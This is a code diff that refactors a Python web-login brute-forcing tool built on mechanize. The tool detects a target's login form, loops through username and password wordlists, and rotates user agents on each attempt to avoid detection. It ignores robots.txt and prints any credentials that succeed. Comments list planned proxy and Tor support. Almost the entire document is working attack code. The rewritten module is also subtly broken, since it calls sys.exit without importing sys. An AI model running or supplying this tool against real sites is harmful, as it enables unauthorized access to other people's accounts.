@@ -1,140 +1,120 @@
-import actions, utils, sys, mechanize
+### REWRITE httpbrute
+## NO oop
 
-##################################################################
-#
-#	TODO:
-#		+) Multi threading
-#		+) Better form detection logic
-#		+) Better automatic login condition - gmail, etc..
-#
-#	TODO FURTHER
-#		+) Proxy support
-#		+) auto parse proxy list, brute forcing multi Proxy
-#		+) sock 5, tor support
-#
-##################################################################
+import mechanize, utils, actions
 
-class BruteForcing(object):
-	def __init__(self, optionURL, optionUserlist, optionPasslist):
-		###############################################################
-		#
-		#	@Ic3W4ll
-		#
-		#	varTargetURL: <protocol>://<domain>/<path>
-		#	varUserAgent: UserAgents; random choice from file
-		#	frmLoginID: ID of login form, for mechanize.Browser().select_form(nr=ID)
-		#	frmUsername: Username form's name, get from parse form
-		#	frmPassword: Password form's name, get from parse form
-		#	lstUsername: Username list, user's option / wordlist
-		#	lstPassword: Passowrd list, user's option / wordlist
-		#	szPassword:	Password list's size (number of lines/ words)
-		#	fndData: Match usernames + passwords
-		#
-		################################################################
+def actionGatherFormInfo(optionURL):
+	######################################
+	#	Test connect to URL
+	#	Fetch login field
+	#	TODO print ONLY ONE status message
+	#
+	#####################################
 
-		self.target_url = optionURL
-		self.user_agent = actions.action_getUserAgent()
-		self.formLoginID = 0
-		self.formUsernameField = ''
-		self.formPasswordField = ''
-		self.lstUsername = optionUserlist
-		self.lstPassword = optionPasslist
-		self.sizePasslist = actions.subaction_countListSize(self.lstPassword)
-		self.credentials = []
-		self.actTestConnection()
+	process = mechanize.Browser()
+	user_agent = actions.getUserAgent()
+	process.addheaders = [('User-Agent', user_agent)]
+	process.set_handle_robots(False)
+	try:
+		process.open(optionURL)
+		#utils.printf("Connected. Getting form information...", "good")
+		formLoginID, formUserfield, formPasswdfield = actions.getFormInformation(process.forms())
+		#utils.printf("Found login form", "good")
+		process.close()
+		return formLoginID, formUserfield, formPasswdfield
+	except TypeError:
+		#utils.printf("Can not find login form", "bad")
+		sys.exit(1)
+	except mechanize.HTTPError as error:
+		#utils.printf(error, "bad")
+		sys.exit(1)
 
-	def actTestConnection(self):
 
-		#	Create Browser object
-		process = mechanize.Browser()
-		process.addheaders = [('User-Agent', self.user_agent)]
-		process.set_handle_robots(False)
 
-		#	Connecting to Target
-		utils.printf("Testing connection....")
+def handle(optionURL, optionUserlist, optionPasslist, sizePasslist):
+	############################################
+	#	Old code logic:
+	#		Create 1 browser object per password
+	#	Current:
+	#		Create 1 browser object per username
+	#		Pick 1 user agent per password try
+	#
+	############################################
 
+
+	#	Get login form field informations
+	frmLoginID, frmUserfield, frmPassfield = actionGatherFormInfo(optionURL)
+
+	#	Get single Username in username list / file
+	for tryUsername in optionUserlist:
+		#	If tryUsername is file object, remove \n
+		#	tryUsername = tryUsername[:-1]
+		tryUsername = tryUsername.replace('\n', '')
 		try:
-			process.open(self.target_url)
-			utils.printf("Connected to URL. Gathering login form information...\n", "good")
-			self.formLoginID, self.formUsernameField, self.formPasswordField = actions.action_getFormInformation(process.forms())
-			utils.printf("Found login form", "good")
-			process.close()
-
-		except TypeError:
-			utils.printf("Can not find any login form in %s" %(self.target_url), "bad")
-			sys.exit(1)
-
-		except mechanize.HTTPError as error:
-			utils.printf(error, "bad")
-			sys.exit(1)
-
-	def actGetResult(self):
-		return self.credentials
-
-	def actTryTargetLogin(self, objBrowser, tryUsername, tryPassword, currentTry):
-		try:
-			#	Fill Login field Information
-			objBrowser.select_form(nr = self.formLoginID)
-			objBrowser.form[self.formUsernameField] = tryUsername
-			objBrowser.form[self.formPasswordField] = tryPassword
-
-			#	Print progress bar
-			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, currentTry, self.sizePasslist))
-
-			#	Send request
-			objBrowser.submit()
-
-			#	Refresh page, useful for redirect after login
-			objBrowser.reload()
-
-			#	If result has no login form  -> Success **NEED IMPROVE**
-			#		add login information to fndData, return True
-
-			if not actions.action_getFormInformation(objBrowser.forms()):
-				utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
-				self.credentials.append([tryUsername, tryPassword])
-				return True
-			return False
-
-		except mechanize.HTTPError as error:
-			utils.printf(error, "bad")
-			sys.exit(1)
-
-	def run(self):
-		#Start brute forcing
-		###############################
-		#	Testing, does not need
-		try:
-			self.lstUsername.seek(0)
+			optionPasslist.seek(0)
 		except:
 			pass
 
-		for currentUsername in self.lstUsername:
+		######	new test code block
+		proc = mechanize.Browser()
+		proc.set_handle_robots(False)
+		######
 
-			currentTry = 0
-			currentUsername = currentUsername.replace('\n', '')
+		idxTry = 0
+		for tryPassword in optionPasslist:
+			#	Get single Password, remove \n
+			tryPassword = tryPassword.replace('\n', '')
 
-			proc = mechanize.Browser()
-			proc.addheaders = [('User-Agent', self.user_agent)]
-			proc.set_handle_robots(False)
-			proc.open(self.target_url)
+			#	New test code block: add new user_agent each try
+			user_agent = actions.getUserAgent()
+			proc.addheaders = [('User-Agent', user_agent)]
+			proc.open(optionURL)
+			#	End new code block
 
-			#######################################
-			#	Read password file from start point
-			#
-			#######################################
+			########	Old good code block
+			# proc = mechanize.Browser()
+			# user_agent = actions.getUserAgent()
+			# proc.addheaders = [('User-Agent', user_agent)]
+			# proc.set_handle_robots(False)
+			# proc.open(optionURL)
+			########	End good code block
+
 			try:
-				self.lstPassword.seek(0)
-			except:
-				pass
+				idxTry += 1
 
-			for currentPassword in self.lstPassword:
-				currentPassword = currentPassword.replace('\n', '')
+				#	Select login form
+				proc.select_form(nr = frmLoginID)
+				proc.form[frmUserfield] = tryUsername
+				proc.form[frmPassfield] = tryPassword
 
-				currentTry += 1
-				if self.actTryTargetLogin(proc, currentUsername, currentPassword, currentTry):
+				#	Print status bar
+				utils.printp(tryUsername, idxTry, sizePasslist)
+
+				#	Send request
+				proc.submit()
+
+				#	Reload - useful for redirect to dashboard
+				proc.reload()
+
+				#	If no login form -> success
+				#	TODO improve condition to use captcha
+				if not actions.getFormInformation(proc.forms()):
+					utils.printf(
+						"Found: %s:%s\n" %(
+							tryUsername,
+							tryPassword
+							),
+						"good"
+					)
+
+					#	Clear object and try new username
+					proc.close()
 					break
 
-			if currentTry == self.sizePasslist:
-				utils.printf("%s: No match found." %(currentUsername), "bad")
-			proc.close()
+			except mechanize.HTTPError as error:
+				#	Get blocked
+				utils.printf(error, "bad")
+				proc.close()
+				sys.exit(1)
+
+		proc.close()
